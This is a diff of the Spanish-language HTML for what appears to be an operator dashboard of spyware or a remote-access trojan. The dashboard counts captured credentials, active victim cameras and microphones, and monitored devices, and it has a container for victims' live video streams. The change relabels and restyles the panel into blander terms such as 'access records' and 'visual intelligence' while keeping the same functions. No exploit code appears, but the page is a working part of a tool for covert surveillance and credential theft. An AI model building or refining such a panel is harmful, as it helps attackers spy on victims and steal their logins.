@@ -21,38 +21,40 @@
         <div class="dashboard">
             <div class="stats">
                 <div class="stat-item">
-                    <span class="stat-label">Dispositivos Conectados</span>
+                    <span class="stat-label">Dispositivos</span>
                     <span class="stat-value" id="device-count">0</span>
                 </div>
                 <div class="stat-item">
-                    <span class="stat-label">Credenciales Capturadas</span>
+                    <span class="stat-label">Credenciales</span>
                     <span class="stat-value" id="credentials-count">0</span>
                 </div>
                 <div class="stat-item">
-                    <span class="stat-label">Cámaras Activas</span>
+                    <span class="stat-label">Cámaras</span>
                     <span class="stat-value" id="camera-count">0</span>
                 </div>
                 <div class="stat-item">
-                    <span class="stat-label">Micrófonos Activos</span>
+                    <span class="stat-label">Micrófonos</span>
                     <span class="stat-value" id="mic-count">0</span>
                 </div>
             </div>
 
-            <div class="device-list">
-                <h2>Dispositivos Monitoreados (Activos)</h2>
-                <div id="devices-container"></div>
-            </div>
+            <div class="main-grid">
+                <div class="device-list">
+                    <h2>Terminales de Monitoreo</h2>
+                    <div id="devices-container"></div>
+                </div>
 
-            <div class="credentials-list" style="margin-top: 20px;">
-                <h2>Credenciales Capturadas</h2>
-                <div id="credentials-container" style="background: #001100; border: 1px solid #0f0; border-radius: 4px; max-height: 200px; overflow-y: auto; padding: 10px;">
-                    <p style="color: #666; font-style: italic;">Sin credenciales capturadas aún.</p>
+                <div class="credentials-list">
+                    <h2>Registros de Acceso (Credenciales)</h2>
+                    <div id="credentials-container">
+                        <p style="color: var(--text-muted); font-size: 0.8rem; text-align: center;">Buscando registros...</p>
+                    </div>
                 </div>
             </div>
 
-            <div class="media-streams" id="media-streams" style="margin-top: 20px; display: none;">
-                <h2>Streams en Vivo</h2>
-                <div style="display: flex; gap: 10px; flex-wrap: wrap;" id="streams-container">
+            <div class="media-streams" id="media-streams">
+                <h2>Señales de Video e Inteligencia Visual</h2>
+                <div id="streams-container">
                     <!-- Los videos de las victimas irán aquí -->
                 </div>
             </div>
